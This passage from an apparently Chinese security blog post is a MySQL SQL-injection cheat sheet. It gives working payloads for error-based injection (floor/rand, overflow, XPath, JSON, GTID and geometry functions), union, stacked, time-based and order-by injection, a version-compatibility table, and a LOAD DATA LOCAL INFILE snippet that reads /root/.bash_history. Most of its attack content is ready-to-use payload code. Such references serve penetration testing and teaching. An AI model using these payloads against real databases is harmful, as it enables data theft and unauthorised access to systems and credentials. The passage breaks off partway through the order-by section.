+<p>如果为<code>secure_file_priv</code>为 NULL，mysql还有个低权限读文件漏洞</p>
+<pre class=" language-plain"><code class="language-plain">mysql> create table mysql.rd1 (code Text);
+mysql> load data local infile '/root/.bash_history' into table mysql.rd1 fields terminated by '';
+mysql> select * from mysql.rd1;
+
+mysql> drop table mysql.rd1;</code></pre>
+<h3 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h3><h4 id="REGEXP、RLIKE"><a href="#REGEXP、RLIKE" class="headerlink" title="REGEXP、RLIKE"></a>REGEXP、RLIKE</h4><ul>
+<li>expr REGEXP pat, expr RLIKE pat</li>
+</ul>
+<h5 id="不同版本下神奇的问题"><a href="#不同版本下神奇的问题" class="headerlink" title="不同版本下神奇的问题"></a>不同版本下神奇的问题</h5><pre class=" language-shell"><code class="language-shell">// 5.5.60-0+deb7u1
+mysql> select 1 regexp 0x00;
+ERROR 1139 (42000): Got error 'empty (sub)expression' from regexp
+
+// 8.0.17
+mysql> select 1 regexp 0x00;
++---------------+
+| 1 regexp 0x00 |
++---------------+
+|             0 |
++---------------+
+
+// 10.3.14-MariaDB-1
+MariaDB [(none)]> select 1 regexp 0x00;
++---------------+
+| 1 regexp 0x00 |
++---------------+
+|             1 |
++---------------+</code></pre>
+<h3 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h3><h4 id="procedure-analyse"><a href="#procedure-analyse" class="headerlink" title="procedure analyse"></a>procedure analyse</h4><p>报错利用需要 <strong>version ∈ [5.5.x, 5.6)</strong>，低于5.5未测试</p>
+<pre class=" language-plain"><code class="language-plain"> [WHERE where_condition]
+    [GROUP BY {col_name | expr | position}
+      [ASC | DESC], ... [WITH ROLLUP]]
+    [HAVING where_condition]
+    [ORDER BY {col_name | expr | position}
+      [ASC | DESC], ...]
+    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
+    [PROCEDURE procedure_name(argument_list)]</code></pre>
+<h2 id="0x03-常见注入方式"><a href="#0x03-常见注入方式" class="headerlink" title="0x03 常见注入方式"></a>0x03 常见注入方式</h2><h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h3><h3 id="报错型"><a href="#报错型" class="headerlink" title="报错型"></a>报错型</h3><p>一句 dump payload，主要利用mysql自定义变量<code>@</code></p>
+<pre class=" language-plain"><code class="language-plain">select concat(@:=0,(select count(*) from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@);</code></pre>
+<p><strong>速查能力表</strong></p>
+<ul>
+<li>默认 MYSQL_ERRMSG_SIZE = 512</li>
+</ul>
+<p><strong>优先考虑<code>函数显错长度</code>，若函数回显长度未限制，则考虑<code>Mysql报错内容长度</code>限制</strong></p>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>函数</th>
+<th>版本需求</th>
+<th>5.5.x</th>
+<th>5.6.x</th>
+<th>5.7.x</th>
+<th>8.x</th>
+<th>函数显错长度</th>
+<th>Mysql报错内容长度</th>
+<th>额外限制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主键重复</td>
+<td>floor <br> round</td>
+<td>❓</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td>64</td>
+<td></td>
+<td>data_type ≠ varchar</td>
+</tr>
+<tr>
+<td>列名重复</td>
+<td>name_const</td>
+<td>❓</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td>only version()</td>
+</tr>
+<tr>
+<td></td>
+<td>join</td>
+<td>[5.5.49, ?)</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td>only columns</td>
+</tr>
+<tr>
+<td>数据溢出 - Double</td>
+<td>1e308 <br> cot <br> exp <br> pow</td>
+<td>[5.5.5, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>MYSQL_ERRMSG_SIZE</td>
+<td></td>
+</tr>
+<tr>
+<td>数据溢出 - BIGINT</td>
+<td></td>
+<td>[5.5.5, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>MYSQL_ERRMSG_SIZE</td>
+<td></td>
+</tr>
+<tr>
+<td>几何对象</td>
+<td>geometrycollection <br> linestring <br> multipoint <br> multipolygon  <br> multilinestring <br> polygon</td>
+<td>[?, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>244</td>
+<td></td>
+</tr>
+<tr>
+<td>空间函数 Geohash</td>
+<td>ST_LatFromGeoHash <br> ST_LongFromGeoHash <br> ST_PointFromGeoHash</td>
+<td>[5.7, ?)</td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td>✔️</td>
+<td>128</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>GTID</td>
+<td>gtid_subset <br> gtid_subtract</td>
+<td>[5.6.5, ?)</td>
+<td></td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>JSON</td>
+<td>json_*</td>
+<td>[5.7.8, 5.7.11]</td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td></td>
+<td>200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>UUID</td>
+<td>uuid_to_bin <br> bin_to_uuid</td>
+<td>[8.0, ?)</td>
+<td></td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td>128</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>XPath</td>
+<td>extractvalue <br> updatexml</td>
+<td>[5.1.5, ?)</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>32</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h4><p><strong>主要利用分组&amp;聚合过程中，多次计算引起的主键重复导致的报错</strong></p>
+<p>在这里利用的就是临时表下面两张图推敲一下大致就可以明白<code>group by x</code>执行的逻辑了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9622f295/15635069803420.jpg" alt="-w752"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9622f295/15635070948155.jpg" alt="-w754"></p>
+<ol>
+<li>首先取一条数据，根据 x 进行查询取值(第一次计算x)，与临时表内进行对比，<strong>临时表内主键为 x</strong></li>
+<li>根据对比结果分两种行为<ol>
+<li>如果已有相同主键，则对count(*)值 + 1</li>
+<li>如果没有，则插入一条新数据，所需要的值(主键)都通过计算获取(第二次计算x)</li>
+</ol>
+</li>
+</ol>
+<h5 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h5><p><strong>注意：经测试，目标字符型数据类型需为 char、text(系列)，若为 varchar 无法报错</strong></p>
+<p>floor&amp;rand：主要是利用rand(0)有序被取整后可产生重复值做主键，配合 count 聚合导致主键重复</p>
+<p>其中<code>rand(0)</code>为有序序列围为<code>0~0.5~1</code>；那么<code>rand(0)*2</code>对应范围为<code>0~1~2</code>，通过 floor 取整后即为<code>0 or 1</code>，<strong>由于需要出现重复的主键，所以至少要执行五次，即至少目标表内有三条数据</strong></p>
+<pre class=" language-plain"><code class="language-plain">mysql> select floor(rand(0)*2) from test;
++------------------+
+| floor(rand(0)*2) |
++------------------+
+|                0 |    # 计算为 0，虚表中无主键 0
+|                1 |    # 计算为 1，作为新主键插入
+|                1 |    # 计算为 1，虚表中有主键 1，直接聚合
+|                0 |    # 计算为 0，虚表中无主键 0
+|                1 |    # 计算为 1，作为新主键插入，触发主键重复报错
+|                1 |
++------------------+
+6 rows in set (0.00 sec)</code></pre>
+<p>下面是网上常见的 payload，注意 database.table 主要是用来聚合报错，需要满足<strong>数据量 &gt;= 3</strong></p>
+<p>P.S. rand(14) -&gt; 0101 因此只需要 2 条数据</p>
+<pre class=" language-plain"><code class="language-plain">select count(*) from &#60;database>.&#60;table> group by concat(&#60;payload>, floor(rand(0)*2));</code></pre>
+<p>实际上只要能触发<code>多次计算</code>以及<code>聚合</code>即可产生主键重复的效果，常见的聚合函数有</p>
+<ul>
+<li><code>AVG([distinct] expr)</code>：求平均值</li>
+<li><code>COUNT({*|[distinct] } expr)</code>：统计行的数量</li>
+<li><code>MAX([distinct] expr)</code>：求最大值</li>
+<li><code>MIN([distinct] expr)</code>：求最小值</li>
+<li><code>SUM([distinct] expr)</code>：求累加和</li>
+</ul>
+<p>以 sum 函数衍生的 payload，其它几个类似</p>
+<pre class=" language-plain"><code class="language-plain">select sum(1),concat(&#60;payload>, floor(rand(0)*2))x from &#60;database>.&#60;table> group by x;</code></pre>
+<p>在 where 使用之后需要 as 成虚表</p>
+<pre class=" language-plain"><code class="language-plain">// use mysql
+mysql > SELECT * FROM user WHERE User='1' or (select x from (select sum(1), concat(user(), floor(rand(0)*2))x from information.schemata group by x)a);
+ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key 'group_key'</code></pre>
+<hr>
+<p>测试时候出现了奇怪的事情</p>
+<ol>
+<li><p>比如在 information_schema.tables 中，一次同时查询 table_schema 和 table_name 的次数满足以下关系</p>
+<p>$\begin{cases}(table\_schema)^{x}+(table\_name)^{y} = Err \\x + y \in [0,2] \end{cases}$</p>
+</li>
+<li><p>如果传入payload数据为<code>字符串</code>，且满足<code>len(payload+1)&gt;=495</code>也不会报错，但是我觉得没人会这么做<em>Orz</em></p>
+</li>
+</ol>
+<h5 id="round"><a href="#round" class="headerlink" title="round"></a>round</h5><p>和 floor 类似，但是 round 会进行四舍五入，根据规则，<strong>round(rand(0)*2)至少需要 16 条数据</strong></p>
+<h4 id="列名重复"><a href="#列名重复" class="headerlink" title="列名重复"></a>列名重复</h4><h4 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h4><p>mysql 列名重复也会报错，<strong>缺点目前只能报版本号</strong></p>
+<pre class=" language-plain"><code class="language-plain">select * from (select name_const(version(),0x1),name_const(version(),0x1))a;</code></pre>
+<h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p><strong>需要 version &gt;= 5.5.49 才可使用</strong></p>
+<p>可以用来报列名</p>
+<pre class=" language-plain"><code class="language-plain">select * from(select * from mysql.user a join mysql.user b)c;
+select * from(select * from mysql.user a join mysql.user b using(Host))c;
+select * from(select * from mysql.user a join mysql.user b using(Host, User[,column]))c;</code></pre>
+<h4 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h4><p>Mysql从<code>5.5.5</code>之后支持 (整型？)溢出报错，官方说明文档<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" target="_blank" rel="noopener">out-of-range-and-overflow</a></p>
+<p><strong>经测试需要 version ∈ [5.5.5, 5.5.49)，之后已不再支持溢出注入攻击</strong></p>
+<p>官方数据类型说明文档：<a href="https://dev.mysql.com/doc/refman/5.7/en/numeric-type-overview.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/numeric-type-overview.html</a></p>
+<h5 id="BIGINT"><a href="#BIGINT" class="headerlink" title="BIGINT"></a>BIGINT</h5><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Storage (Bytes)</th>
+<th>Minimum Value Signed</th>
+<th>Minimum Value Unsigned</th>
+<th>Maximum Value Signed</th>
+<th>Maximum Value Unsigned</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TINYINT</td>
+<td>1</td>
+<td>-128</td>
+<td>0</td>
+<td>127</td>
+<td>255</td>
+</tr>
+<tr>
+<td>SMALLINT</td>
+<td>2</td>
+<td>-32768</td>
+<td>0</td>
+<td>32767</td>
+<td>65535</td>
+</tr>
+<tr>
+<td>MEDIUMINT</td>
+<td>3</td>
+<td>-8388608</td>
+<td>0</td>
+<td>8388607</td>
+<td>16777215</td>
+</tr>
+<tr>
+<td>INT</td>
+<td>4</td>
+<td>-2147483648</td>
+<td>0</td>
+<td>2147483647</td>
+<td>4294967295</td>
+</tr>
+<tr>
+<td>BIGINT</td>
+<td>8</td>
+<td>-2^63 <br> =-9223372036854775807</td>
+<td>0</td>
+<td>2^63-1 <br> =9223372036854775807</td>
+<td>2^64-1 <br> =18446744073709551615</td>
+</tr>
+</tbody></table>
+<p>只要运算值溢出范围即可，变形很多种</p>
+<pre class=" language-plain"><code class="language-plain"># bigint unsigned
+select if((select * from (select &#60;payload>)b),2,2)+18446744073709551615;
+# bigint signed
+select (x!=0x0)--9223372036854775807 from (select (&#60;payload>)x)y;
+select !(select * from (select &#60;payload>)b)-~0;</code></pre>
+<h5 id="DOUBLE"><a href="#DOUBLE" class="headerlink" title="DOUBLE"></a>DOUBLE</h5><ul>
+<li><p>FLOAT[(M,D)] [UNSIGNED] [ZEROFILL]</p>
+<p>一个小的（单精度）浮点数。允许值是-3.402823466E+38 对-1.175494351E-38， 0以及1.175494351E-38 对3.402823466E+38。这些是基于IEEE标准的理论限制。实际范围可能略小，具体取决于您的硬件或操作系统。</p>
+</li>
+<li><p>DOUBLE[(M,D)] [UNSIGNED] [ZEROFILL]</p>
+<p>正常大小（双精度）浮点数。允许值是 -1.7976931348623157E+308对 -2.2250738585072014E-308， 0以及 2.2250738585072014E-308对 1.7976931348623157E+308。这些是基于IEEE标准的理论限制。实际范围可能略小，具体取决于您的硬件或操作系统。</p>
+</li>
+</ul>
+<h6 id="1e308"><a href="#1e308" class="headerlink" title="1e308"></a>1e308</h6><p>以 10 为底指数函数求值，只要在范围之内均可，比如<code>1.7e308</code>等</p>
+<pre class=" language-plain"><code class="language-plain">select if((select * from (select (&#60;payload>))x),2,2)*1e308;
+select if(x,2,2)*1e308 from (select (&#60;payload>)x)y;</code></pre>
+<h6 id="cot"><a href="#cot" class="headerlink" title="cot"></a>cot</h6><pre class=" language-plain"><code class="language-plain">select cot((select *from (select &#60;payload>)y));</code></pre>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><p>以 e 为底指数函数求值，配合~取反函数进行整数溢出报错</p>
+<ul>
+<li><code>exp(x)</code>：e^x</li>
+<li><code>~x</code>：x取反</li>
+</ul>
+<p>内部一层 select * from 是为了将目标内容作为一张表来读取，这样报错会提示出错<code>化名</code>，即目标内容</p>
+<pre class=" language-plain"><code class="language-plain">select exp(~(select * from (select &#60;payload>)a));</code></pre>
+<h6 id="pow"><a href="#pow" class="headerlink" title="pow"></a>pow</h6><p>指数运算，很好理解</p>
+<pre><code>select pow(2,~x) from (select (&amp;#60;payload&gt;)x)y;</code></pre><h4 id="几何对象"><a href="#几何对象" class="headerlink" title="几何对象"></a><a href="https://dev.mysql.com/doc/refman/5.7/en/gis-mysql-specific-functions.html" target="_blank" rel="noopener">几何对象</a></h4><p>具体内容参考：</p>
+<ul>
+<li><a href="https://blog.csdn.net/long535/article/details/75714781" target="_blank" rel="noopener">https://blog.csdn.net/long535/article/details/75714781</a></li>
+<li><a href="https://www.kancloud.cn/yangweijie/mysql5_1/42714" target="_blank" rel="noopener">https://www.kancloud.cn/yangweijie/mysql5_1/42714</a></li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9622f295/15635008420851.jpg" alt></p>
+<p>利用方式均为以下格式，<strong>但还没搞清为什么需要 as 两次</strong></p>
+<p><strong>需要 version &#60;= 5.5.48 才可使用</strong></p>
+<pre class=" language-plain"><code class="language-plain">select target_function((select * from(select * from(select &#60;payload>)a)b));</code></pre>
+<h5 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection"></a>geometrycollection</h5><h5 id="linestring"><a href="#linestring" class="headerlink" title="linestring"></a>linestring</h5><ul>
+<li>LineString(pt [, pt] …)</li>
+</ul>
+<p>除上面利用方式外，注入点 where 之后可用于爆当前库、表明，但需要知道具体字段</p>
+<p>此利用方式需要版本[?, ?)，测试通过版本 [5.5.x ~ 8.x]</p>
+<pre class=" language-plain"><code class="language-plain">mysql> select * from &#60;database>.&#60;table> where linestring(&#60;known_column>);
+
+mysql> select * from mysql.user where linestring(User);
+ERROR 1367 (22007): Illegal non geometric '`mysql`.`user`.`User`' value found during parsing</code></pre>
+<h5 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint"></a>multipoint</h5><h5 id="multipolygon"><a href="#multipolygon" class="headerlink" title="multipolygon"></a>multipolygon</h5><h5 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring"></a>multilinestring</h5><h5 id="polygon"><a href="#polygon" class="headerlink" title="polygon"></a>polygon</h5><h4 id="空间函数Geohash"><a href="#空间函数Geohash" class="headerlink" title="空间函数Geohash"></a>空间函数<a href="https://dev.mysql.com/doc/refman/5.7/en/spatial-geohash-functions.html" target="_blank" rel="noopener">Geohash</a></h4><p><strong>需要 version ∈ [5.7, ?)</strong></p>
+<h5 id="ST-LatFromGeoHash"><a href="#ST-LatFromGeoHash" class="headerlink" title="ST_LatFromGeoHash"></a>ST_LatFromGeoHash</h5><pre class=" language-plain"><code class="language-plain">select ST_LongFromGeoHash(&#60;payload>);</code></pre>
+<h5 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST_LongFromGeoHash"></a>ST_LongFromGeoHash</h5><pre class=" language-plain"><code class="language-plain">select ST_LongFromGeoHash(&#60;payload>);</code></pre>
+<h5 id="ST-PointFromGeoHash"><a href="#ST-PointFromGeoHash" class="headerlink" title="ST_PointFromGeoHash"></a>ST_PointFromGeoHash</h5><pre class=" language-plain"><code class="language-plain">select ST_PointFromGeoHash(&#60;payload>, 1);</code></pre>
+<h4 id="GTID"><a href="#GTID" class="headerlink" title="GTID"></a>GTID</h4><p><strong>需要 version =&gt; <a href="https://dev.mysql.com/doc/refman/5.6/en/gtid-functions.html" target="_blank" rel="noopener">5.6.5</a> 才可使用</strong></p>
+<p>利用方式</p>
+<pre class=" language-plain"><code class="language-plain">select target_function(&#60;payload>, 0);</code></pre>
+<h5 id="gtid-subset"><a href="#gtid-subset" class="headerlink" title="gtid_subset"></a>gtid_subset</h5><h5 id="gtid-subtract"><a href="#gtid-subtract" class="headerlink" title="gtid_subtract"></a>gtid_subtract</h5><h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a><a href="https://dev.mysql.com/doc/refman/5.7/en/json.html" target="_blank" rel="noopener">JSON</a></h4><p><strong>需要 version ∈ [5.7.8, 5.7.11] 才可使用</strong></p>
+<p>被测试函数可能不全，其他 json 函数可自测</p>
+<h5 id="构造异常-json-doc"><a href="#构造异常-json-doc" class="headerlink" title="构造异常 json_doc"></a>构造异常 json_doc</h5><h6 id="json-merge"><a href="#json-merge" class="headerlink" title="json_merge"></a>json_merge</h6><pre class=" language-plain"><code class="language-plain">select json_merge(&#60;payload>, 2);</code></pre>
+<h5 id="多种构造"><a href="#多种构造" class="headerlink" title="多种构造"></a>多种构造</h5><ol>
+<li><p>构造异常 json_doc</p>
+<pre class=" language-plain"><code class="language-plain"> select target_function(&#60;payload>, 2);</code></pre>
+</li>
+<li><p>构造异常 path</p>
+<pre class=" language-plain"><code class="language-plain"> select target_function('[]', &#60;payload>, 2);
+ select target_function(json_array(), &#60;payload>, 2);
+
+ select target_function('{}', &#60;payload>, 2);
+ select target_function(json_object(), &#60;payload>, 2);</code></pre>
+</li>
+</ol>
+<h6 id="json-remove"><a href="#json-remove" class="headerlink" title="json_remove"></a>json_remove</h6><ul>
+<li>JSON_REMOVE(json_doc, path[, path] …)</li>
+</ul>
+<ol>
+<li><p>构造异常 json_doc</p>
+<p> 同上</p>
+</li>
+<li><p>构造异常 path</p>
+<pre class=" language-plain"><code class="language-plain"> select json_remove('[]', &#60;payload>);</code></pre>
+</li>
+</ol>
+<h6 id="json-array-insert"><a href="#json-array-insert" class="headerlink" title="json_array_insert"></a>json_array_insert</h6><ul>
+<li>JSON_ARRAY_INSERT(json_doc, path, val[, path, val] …)</li>
+</ul>
+<h6 id="json-array-append"><a href="#json-array-append" class="headerlink" title="json_array_append"></a>json_array_append</h6><ul>
+<li>JSON_ARRAY_APPEND(json_doc, path, val[, path, val] …)</li>
+</ul>
+<h6 id="json-insert"><a href="#json-insert" class="headerlink" title="json_insert"></a>json_insert</h6><ul>
+<li>JSON_INSERT(json_doc, path, val[, path, val] …)</li>
+</ul>
+<h6 id="json-keys"><a href="#json-keys" class="headerlink" title="json_keys"></a>json_keys</h6><ul>
+<li>JSON_KEYS(json_doc[, path])</li>
+</ul>
+<ol>
+<li><p>构造异常 json_doc </p>
+<pre class=" language-plain"><code class="language-plain"> select json_keys(&#60;payload>);</code></pre>
+</li>
+<li><p>构造异常 path</p>
+<pre class=" language-plain"><code class="language-plain"> select json_keys('[]', &#60;payload>);</code></pre>
+</li>
+</ol>
+<h6 id="json-replace"><a href="#json-replace" class="headerlink" title="json_replace"></a>json_replace</h6><ul>
+<li>JSON_REPLACE(json_doc, path, val[, path, val] …)</li>
+</ul>
+<h6 id="json-set"><a href="#json-set" class="headerlink" title="json_set"></a>json_set</h6><ul>
+<li>JSON_SET(json_doc, path, val[, path, val] …)</li>
+</ul>
+<h4 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a><a href="https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html" target="_blank" rel="noopener">UUID</a></h4><pre class=" language-plain"><code class="language-plain">select target_function(&#60;payload>);</code></pre>
+<h5 id="bin-to-uuid"><a href="#bin-to-uuid" class="headerlink" title="bin_to_uuid"></a>bin_to_uuid</h5><ul>
+<li>BIN_TO_UUID(binary_uuid)</li>
+</ul>
+<h5 id="uuid-to-bin"><a href="#uuid-to-bin" class="headerlink" title="uuid_to_bin"></a>uuid_to_bin</h5><ul>
+<li>UUID_TO_BIN(string_uuid)</li>
+</ul>
+<h4 id="XPATH"><a href="#XPATH" class="headerlink" title="XPATH"></a>XPATH</h4><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是<code>ExtractValue()</code>和<code>UpdateXML()</code></p>
+<h6 id="make-set-1"><a href="#make-set-1" class="headerlink" title="make_set"></a>make_set</h6><p>由于 xpath 特殊性，所以必须使用 concat 避免特殊字符前的内容被过滤，假如 concat 被禁用，可以使用 make_set 绕过</p>
+<ul>
+<li>MAKE_SET(bits,str1,str2,…)</li>
+</ul>
+<p>这个函数的操作有点诡异：make_set 会先将 bits 值化为二进制，再倒叙一遍，比如<code>1 -&gt; 0001 -&gt; 1000</code>，再将值为 1 的对应位字符串进行输出，例如</p>
+<pre class=" language-plain"><code class="language-plain"># 5 -> 101 -> 101
+mysql> select make_set(5,'hello','nice','world');
++------------------------------------+
+| make_set(5,'hello','nice','world') |
++------------------------------------+
+| hello,world                        |
++------------------------------------+
+
+# 1|4 = 0001 | 0100 -> 0101 -> 1010
+mysql> select make_set(1 | 4,'hello','nice','world');
++----------------------------------------+
+| make_set(1 | 4,'hello','nice','world') |
++----------------------------------------+
+| hello,world                            |
++----------------------------------------+</code></pre>
+<p>利用方式</p>
+<pre class=" language-plain"><code class="language-plain">select extractvalue(1,make_set(3, 0x1, &#60;payload>));</code></pre>
+<h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a><a href="https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_extractvalue" target="_blank" rel="noopener">extractvalue</a></h5><p>对 xml 文档进行查询</p>
+<ul>
+<li>extractvalue(xml_frag, xpath_expr)</li>
+</ul>
+<p>可用拼接字符：<code>0x00~0x1f</code>,<code>!</code>,<code>&quot;</code>,<code>#</code>,<code>%</code>,<code>&amp;</code>,<code>&#39;</code>,<code>)</code>,<code>*</code>,<code>+</code>,<code>,</code>,<code>.</code>,<code>:</code>,<code>;</code>,<code>&lt;</code>,<code>=</code>,<code>&gt;</code>,<code>?</code>,<code>[</code>,<code>\</code>,<code>]</code>,<code>^</code>,&#60;code&gt;&#x60;&#60;/code&gt;,<code>{</code>,<code>|</code>,<code>}</code>,<code>~</code><br>其中<code>*</code>,<code>.</code>以及控制字符无对应回显字符</p>
+<pre class=" language-plain"><code class="language-plain">select extractvalue(1, concat(0x1, &#60;payload>));</code></pre>
+<h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a><a href="https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_updatexml" target="_blank" rel="noopener">updatexml</a></h5><ul>
+<li>updatexml(xml_target, xpath_expr, new_xml)</li>
+</ul>
+<p>和<code>extractvalue</code>同属于xml功能函数，所以很像</p>
+<pre class=" language-plain"><code class="language-plain">select updatexml(1, concat(0x1, &#60;payload>), 3);</code></pre>
+<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre class=" language-plain"><code class="language-plain"># 利用 distinct 去重
+-1' union select 1,user(), group_concat(distinct table_name) from information_schema.columns where TABLE_SCHEMA=0x7365637572697479;
+-1' union select 1,user(), group_concat(COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA=0x7365637572697479 and table_name=0x7573657273 %23</code></pre>
+<h3 id="堆叠注入-多语句查询注入"><a href="#堆叠注入-多语句查询注入" class="headerlink" title="堆叠注入/多语句查询注入"></a>堆叠注入/多语句查询注入</h3><p>stacked 和 union 最大区别在于前者完整支持CRUD，后者只支持select</p>
+<p>在 php 中</p>
+<ul>
+<li>mysqli_query 只能执行一次查询，不支持堆叠</li>
+<li>mysqli_multi_query 允许多次查询，支持堆叠</li>
+</ul>
+<pre class=" language-url"><code class="language-url">id=1;update ...;select ...;</code></pre>
+<h3 id="基于时间延迟注入"><a href="#基于时间延迟注入" class="headerlink" title="基于时间延迟注入"></a>基于时间延迟注入</h3><h4 id="sleep-1"><a href="#sleep-1" class="headerlink" title="sleep"></a>sleep</h4><p>函数详情见<code>时间函数-sleep</code></p>
+<pre class=" language-plain"><code class="language-plain">mysql> select sleep(if(hex(left(version(),1))=35, 1, 0));</code></pre>
+<h4 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h4><p>利用笛卡尔运算，造成大量查询产生的延时</p>
+<p>$$\left[\begin{matrix} 1 &amp; a \\ 2 &amp; b \\ \end{matrix} \right] \times<br>\left[\begin{matrix} 3 &amp; c \\ 4 &amp; d \ \end{matrix} \right] =<br>\left[\begin{matrix} 1 &amp; a &amp; 3 &amp; c \\ 1 &amp; a &amp; 4 &amp; d \\ 2 &amp; b &amp; 3 &amp; c \\ 2 &amp; b &amp; 4 &amp; d \\ \end{matrix} \right]$$</p>
+<pre class=" language-plain"><code class="language-plain">// 同一表做笛卡尔乘积需要别名以免冲突
+mysql> select * from mysql.user, mysql.user as b, mysql.user as c;</code></pre>
+<h4 id="benchmark-1"><a href="#benchmark-1" class="headerlink" title="benchmark"></a>benchmark</h4><p>函数详情见<code>信息函数-benchmark</code></p>
+<pre class=" language-plain"><code class="language-plain">mysql> select benchmark(if(hex(left(version(),1))=35, 10000000, 0), md5('1'));</code></pre>
+<h4 id="REGEXP、RLIKE-1"><a href="#REGEXP、RLIKE-1" class="headerlink" title="REGEXP、RLIKE"></a>REGEXP、RLIKE</h4><ul>
+<li>expr REGEXP pat, expr RLIKE pat</li>
+</ul>
+<p>通过大量匹配造成延时</p>
+<pre class=" language-plain"><code class="language-plain">mysql> select rpad('a',1048576,'a') RLIKE concat(repeat('(a.*)+',30),'b');</code></pre>
+<h4 id="get-lock"><a href="#get-lock" class="headerlink" title="get_lock"></a>get_lock</h4><ul>
+<li>GET_LOCK(str,timeout)</li>
+</ul>
+<p><strong>需要长连接</strong></p>
+<p>通过在当前 session 锁定一个变量，另一个 session 尝试请求后超时实现延时效果</p>
+<p>详见：<a href="https://zhuanlan.zhihu.com/p/35245598" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/35245598</a></p>
+<h2 id="0x04-其他姿势"><a href="#0x04-其他姿势" class="headerlink" title="0x04 其他姿势"></a>0x04 其他姿势</h2><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><p>需要先了解 order by 语法</p>
+<pre class=" language-plain"><code class="language-plain">[ORDER BY {col_name | expr | position}
+    [ASC | DESC], ...]</code></pre>
+<h4 id="常规姿势"><a href="#常规姿势" class="headerlink" title="常规姿势"></a>常规姿势</h4><pre class=" language-plain"><code class="language-plain">// col_name
+但是注意，类似如下的返回id字段，实际上排序时进行了转义
+?order=IF(1=1,id,username) &#60;-> ?order=cast(id as char)
+
+// expr
+rand(0=1)
+这里简单提一下 rand 是对每行结果进行一次计算，再根据结果排序，所以对大数据进行order by rand()会非常慢
+同理 sleep(1) 会睡眠 row * time
+
+// position
+在条件判断里返回的值即使为整型也不会被当做 position，如果需要的话必须在外部指定
+?order=1, IF(...)</code></pre>
+<h4 id="常见配合语句"><a href="#常见配合语句" class="headerlink" title="常见配合语句"></a>常见配合语句</h4><p>无回显一般提倡 rand，耗时短且差异显著</p>
+<ol>
+<li>error 显错</li>
+</ol>
+<p>按显错注入攻击即可</p>
+<ol start="2">
+<li>sleep、rand 盲注</li>
+</ol>
+<p>能通过函数能获取页面存在差异性，即通过页面相似度进行攻击</p>
+<ol start="3">
+<li>位运算符，主要使用<code>^</code>亦或运算，其他也可</li>
+</ol>
+<pre class=" language-plain"><code class="language-plain">order by id ^ (select (select version()) regexp '^5');
+order by id ^ (select (select version()) regexp 0x5e35);  # 0x5e35 &#60;-> hex('^5') 
+# 注意 regexp 在不同版本下对十六进制匹配会有些微小的差异</code></pre>
+<ol start="4">
+<li>union</li>
